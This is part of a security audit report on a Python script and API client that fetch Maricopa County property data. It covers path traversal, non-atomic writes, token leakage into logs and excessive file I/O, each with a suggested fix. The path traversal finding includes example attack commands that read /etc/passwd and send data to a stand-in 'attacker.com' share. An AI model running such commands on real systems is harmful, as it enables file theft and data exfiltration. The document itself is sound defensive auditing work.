# HIGH Issues (Should Fix Soon)

### HIGH-001: Path Traversal Vulnerability in File Operations

**File:** `scripts/extract_county_data.py:80-91`
**Severity:** HIGH
**CVSS Score:** 7.5 (High)

```python
# extract_county_data.py (lines 80-91)
parser.add_argument(
    "--csv",
    type=Path,
    default=Path("data/phx_homes.csv"),
    help="Input CSV file with properties (default: data/phx_homes.csv)",
)
parser.add_argument(
    "--enrichment",
    type=Path,
    default=Path("data/enrichment_data.json"),
    help="Enrichment JSON file to update (default: data/enrichment_data.json)",
)
```

**Issue:**
User-supplied file paths are not validated or sanitized before use. An attacker can use path traversal sequences to read/write arbitrary files.

**Attack Scenario:**
```bash
# Read sensitive files
python scripts/extract_county_data.py --all \
  --csv "../../../../etc/passwd" \
  --enrichment "/tmp/stolen_data.json"

# Overwrite system files (if permissions allow)
python scripts/extract_county_data.py --all \
  --enrichment "../../../critical_config.json"

# Exfiltrate data to attacker-controlled location
python scripts/extract_county_data.py --all \
  --enrichment "//attacker.com/share/data.json"
```

**Impact:**
- Arbitrary file read/write within user's permissions
- Data exfiltration to attacker-controlled locations
- Overwrite critical application data
- Potential privilege escalation if combined with other vulnerabilities

**Remediation:**
```python
# Add path validation function
from pathlib import Path
import os

def validate_file_path(
    path: Path,
    allowed_base: Path = Path("data"),
    must_exist: bool = False,
) -> Path:
    """Validate and sanitize file path to prevent traversal attacks.

    Args:
        path: User-supplied path
        allowed_base: Base directory that path must be within
        must_exist: If True, path must exist

    Returns:
        Resolved, validated Path object

    Raises:
        ValueError: If path is invalid or outside allowed base
    """
    try:
        # Resolve to absolute path (eliminates .. sequences)
        resolved_path = path.resolve()
        resolved_base = allowed_base.resolve()

        # Check if path is within allowed base
        if not str(resolved_path).startswith(str(resolved_base)):
            raise ValueError(
                f"Path {path} is outside allowed directory {allowed_base}"
            )

        # Check existence if required
        if must_exist and not resolved_path.exists():
            raise ValueError(f"Path {path} does not exist")

        return resolved_path

    except (OSError, RuntimeError) as e:
        raise ValueError(f"Invalid path {path}: {e}") from e

# Apply validation in parse_args
def parse_args() -> argparse.Namespace:
    # ... existing parser setup ...

    args = parser.parse_args()

    # Validate paths
    try:
        args.csv = validate_file_path(args.csv, Path("data"), must_exist=True)
        args.enrichment = validate_file_path(args.enrichment, Path("data"))
    except ValueError as e:
        parser.error(str(e))

    return args
```

**References:**
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

---

### HIGH-002: Unsafe File Write Without Atomic Operations

**File:** `scripts/extract_county_data.py:135-149`
**Severity:** HIGH
**CVSS Score:** 6.5 (Medium-High)

```python
# extract_county_data.py (lines 135-149)
def save_enrichment(path: Path, data: dict) -> None:
    """Save enrichment data to JSON.

    Converts dict format back to list format for storage.
    """
    path.parent.mkdir(parents=True, exist_ok=True)

    # Convert dict back to list format
    data_list = [
        {"full_address": addr, **props}
        for addr, props in data.items()
    ]

    with open(path, "w", encoding="utf-8") as f:
        json.dump(data_list, f, indent=2, ensure_ascii=False)
```

**Issue:**
File is written directly without atomic operations. If the write fails mid-operation (crash, disk full, ctrl+c), the JSON file will be corrupted and data will be lost.

**Impact:**
- Data corruption if write interrupted
- Complete data loss (no backup mechanism)
- No rollback capability
- Difficult to recover from failures

**Remediation:**
```python
import tempfile
import shutil
from pathlib import Path
import json

def save_enrichment(path: Path, data: dict) -> None:
    """Save enrichment data to JSON with atomic write.

    Uses atomic write pattern:
    1. Write to temporary file in same directory
    2. fsync to ensure data written to disk
    3. Atomic rename over original file
    4. Create backup before overwrite

    Args:
        path: Target JSON file path
        data: Enrichment data dictionary
    """
    path.parent.mkdir(parents=True, exist_ok=True)

    # Convert dict back to list format
    data_list = [
        {"full_address": addr, **props}
        for addr, props in data.items()
    ]

    # Create backup of existing file
    if path.exists():
        backup_path = path.with_suffix(f".json.backup.{int(time.time())}")
        shutil.copy2(path, backup_path)

        # Cleanup old backups (keep last 5)
        backups = sorted(
            path.parent.glob(f"{path.stem}.json.backup.*"),
            key=lambda p: p.stat().st_mtime,
            reverse=True
        )
        for old_backup in backups[5:]:
            old_backup.unlink()

    # Atomic write via temporary file
    temp_fd, temp_path = tempfile.mkstemp(
        dir=path.parent,
        prefix=f".{path.name}.",
        suffix=".tmp"
    )

    try:
        with os.fdopen(temp_fd, 'w', encoding='utf-8') as f:
            json.dump(data_list, f, indent=2, ensure_ascii=False)
            f.flush()
            os.fsync(f.fileno())  # Ensure written to disk

        # Atomic rename (on POSIX, overwrites atomically)
        os.replace(temp_path, path)

    except Exception as e:
        # Cleanup temp file on error
        try:
            os.unlink(temp_path)
        except OSError:
            pass
        raise DataSaveError(f"Failed to save enrichment data: {e}") from e
```

**Testing:**
```python
# Test interruption during write
def test_atomic_write_interruption():
    """Verify file integrity after interrupted write."""
    # Original data
    original = {"addr1": {"lot_sqft": 8000}}
    save_enrichment(path, original)

    # Simulate write interruption
    with mock.patch('json.dump', side_effect=KeyboardInterrupt):
        with pytest.raises(KeyboardInterrupt):
            save_enrichment(path, {"addr2": {"lot_sqft": 9000}})

    # Original file should be intact
    loaded = load_enrichment(path)
    assert loaded == original
```

---

### HIGH-003: API Token Potentially Logged in Error Messages

**File:** `src/phx_home_analysis/services/county_data/assessor_client.py:142-149`
**Severity:** HIGH
**CVSS Score:** 6.8 (Medium-High)

```python
# assessor_client.py (lines 138-149)
async def _search_official_api(self, street: str) -> str | None:
    """Search via Official API."""
    url = f"{OFFICIAL_API_BASE}/search/property/"
    params = {"q": street}
    headers = {"AUTHORIZATION": self._token}  # Token in headers

    try:
        response = await self._http.get(url, params=params, headers=headers)
        # ... error handling ...
    except httpx.HTTPError as e:
        logger.debug(f"Official API search failed: {e}")  # May log token
```

**Issue:**
httpx exceptions may include request headers containing the API token. Debug logging could expose tokens in log files.

**Impact:**
- Token exposure in application logs
- Token visible in crash reports/error traces
- Unauthorized API access if logs are compromised

**Remediation:**
```python
class MaricopaAssessorClient:
    """HTTP client with secure logging."""

    def __init__(self, ...):
        # ... existing init ...

        # Create HTTP client with custom event hooks
        self._http = httpx.AsyncClient(
            timeout=self._timeout,
            event_hooks={
                'request': [self._log_request_safe],
                'response': [self._log_response_safe],
            }
        )

    async def _log_request_safe(self, request: httpx.Request):
        """Log request without sensitive headers."""
        safe_headers = {
            k: '***REDACTED***' if k.upper() in ('AUTHORIZATION', 'API-KEY', 'X-API-KEY')
            else v
            for k, v in request.headers.items()
        }
        logger.debug(f"Request: {request.method} {request.url}, headers={safe_headers}")

    async def _log_response_safe(self, response: httpx.Response):
        """Log response without sensitive data."""
        logger.debug(f"Response: {response.status_code} from {response.url}")

    async def _search_official_api(self, street: str) -> str | None:
        """Search via Official API with safe error handling."""
        url = f"{OFFICIAL_API_BASE}/search/property/"
        params = {"q": street}
        headers = {"AUTHORIZATION": self._token}

        try:
            response = await self._http.get(url, params=params, headers=headers)

            if response.status_code == 401:
                logger.warning("Official API auth failed (token may be invalid)")
                return None

            # ... rest of handling ...

        except httpx.HTTPError as e:
            # Never log exception directly (may contain headers)
            logger.debug(f"Official API search failed: {type(e).__name__} for {street}")
            return None
```

**Additional Hardening:**
```python
# Add to logging configuration
import logging

class SensitiveDataFilter(logging.Filter):
    """Filter sensitive data from log records."""

    SENSITIVE_PATTERNS = [
        r'MARICOPA_ASSESSOR_TOKEN=[\w-]+',
        r'AUTHORIZATION[\'"]?\s*:\s*[\'"]?[\w-]+',
        r'token=[\w-]+',
    ]

    def filter(self, record: logging.LogRecord) -> bool:
        message = record.getMessage()
        for pattern in self.SENSITIVE_PATTERNS:
            message = re.sub(pattern, r'***REDACTED***', message)
        record.msg = message
        return True

# Apply filter
logger = logging.getLogger(__name__)
logger.addFilter(SensitiveDataFilter())
```

---

### HIGH-004: No Rate Limiting on File Operations

**File:** `scripts/extract_county_data.py:461-492`
**Severity:** HIGH
**CVSS Score:** 5.3 (Medium)

```python
# extract_county_data.py (lines 461-492)
async with MaricopaAssessorClient(rate_limit_seconds=args.rate_limit) as client:
    for i, prop in enumerate(properties, 1):
        print(f"[{i}/{len(properties)}] {prop.street}")

        try:
            parcel = await client.extract_for_address(prop.street)
            # ... process ...

            # Merge and SAVE on EVERY iteration
            if not args.dry_run:
                updated_entry, conflicts = merge_parcel_into_enrichment(...)
                enrichment[prop.full_address] = updated_entry

        except Exception as e:
            logger.error(f"  Error: {e}")
```

**Issue:**
While API calls are rate-limited, there's no rate limiting on file I/O operations. The enrichment file is saved after EVERY property extraction (line 494), which is inefficient and creates a DoS vulnerability.

**Impact:**
- Disk I/O exhaustion with large property lists
- Unnecessary wear on SSD storage
- Potential DoS if processing thousands of properties
- Performance degradation

**Remediation:**
```python
# Batch file writes instead of per-property writes
async def main() -> int:
    # ... existing setup ...

    results = []
    failed = []
    all_conflicts = {}

    # Batch size for file writes
    BATCH_SIZE = 50
    write_counter = 0

    async with MaricopaAssessorClient(rate_limit_seconds=args.rate_limit) as client:
        for i, prop in enumerate(properties, 1):
            print(f"[{i}/{len(properties)}] {prop.street}")

            try:
                parcel = await client.extract_for_address(prop.street)

                if not parcel:
                    print("  No data found")
                    failed.append(prop.full_address)
                    continue

                print_parcel_summary(parcel)
                results.append((prop.full_address, parcel))

                # Merge into enrichment (in-memory)
                if not args.dry_run:
                    updated_entry, conflicts = merge_parcel_into_enrichment(
                        enrichment,
                        prop.full_address,
                        parcel,
                        args.update_only,
                        logger,
                        tracker,
                    )
                    enrichment[prop.full_address] = updated_entry
                    all_conflicts[prop.full_address] = conflicts
                    write_counter += 1

                    # Save periodically (every BATCH_SIZE properties)
                    if write_counter >= BATCH_SIZE:
                        logger.info(f"Saving batch checkpoint ({write_counter} properties)")
                        save_enrichment(args.enrichment, enrichment)
                        tracker.save()
                        write_counter = 0

            except Exception as e:
                logger.error(f"  Error: {e}")
                failed.append(prop.full_address)

    # Final save (any remaining properties)
    if not args.dry_run and (results or write_counter > 0):
        save_enrichment(args.enrichment, enrichment)
        tracker.save()
        logger.info(f"Saved {len(enrichment)} records to {args.enrichment}")

    # ... rest of function ...
```

---
